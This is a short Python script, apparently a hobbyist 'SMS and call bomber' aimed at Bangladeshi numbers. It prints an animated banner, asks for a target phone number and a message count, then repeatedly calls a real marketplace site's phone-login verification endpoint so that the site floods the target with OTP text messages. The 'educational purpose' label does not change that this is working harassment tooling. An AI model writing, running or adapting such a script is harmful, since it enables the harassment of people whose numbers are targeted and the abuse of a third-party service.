import os
import time 
import requests
import sys

# ✅ Function for animated printing
def animated_print(text, delay=0.05):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)

# ✅ Clear screen before starting
def clear_screen():
    os.system("clear")

while True:
    clear_screen()
    
    print("\n\n\n")
    animated_print("\t\t\033[1;33mSystem Loading...\033[0m\n", 0.1)
    time.sleep(1.8)
    clear_screen()
    
    print("\n\n\n")
    animated_print("\t\033[1;32mSuccessfully Loaded. Thanks For Waiting.\033[0m\n", 0.1)
    time.sleep(1.8)

    while True:       
        clear_screen()
        
        logo = """
\033[1;34m================================================

 \t\033[1;36m _____  _____ ________      _______  
 \t|  __ \\|_   _|___  /\\ \\    / /_   _| 
 \t| |__) | | |    / /  \\ \\  / /  | |   
 \t|  _  /  | |   / /    \\ \\/ /   | |   
 \t| | \\ \\ _| |_ / /__    \\  /   _| |_  
 \t|_|  \\_\\_____/_____|    \\/   |_____| 







       Author   : Rizvi Ahmed
       Facebook : Unknown 
       Github   : Unknown 
       Group    : Unknown

  Use the tool for Educational Purpose

\033[1;34m================================================\033[0m
"""
        animated_print(logo, 0.02)

        first_line = """\033[1;32m
------------------------------------------------
|                                              |
|    SMS And Call Bomber For Only Bangladeshi  |
|                                              |
------------------------------------------------\n\n\033[0m"""
        animated_print(first_line, 0.01)

        # Break the loop after displaying once
        break  # 🔁 Remove or customize this based on next action
    break  # 🔁 Remove this if you want the outer loop to continue



def header(text, delay):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)



num = input("\tEnter target number : ")
am = int(input("\tEnter Ammount : "))

sent = 0 

while sent<am:
    r = requests.get('https://bikroy.com/data/phone_number_login/verifications/phone_login?phone='+num)
   
    if r.status_code == 200:
        sent+=1
        print(f"\n\033[1;33m{sent} message sent successfully  ")
    else:
        pass








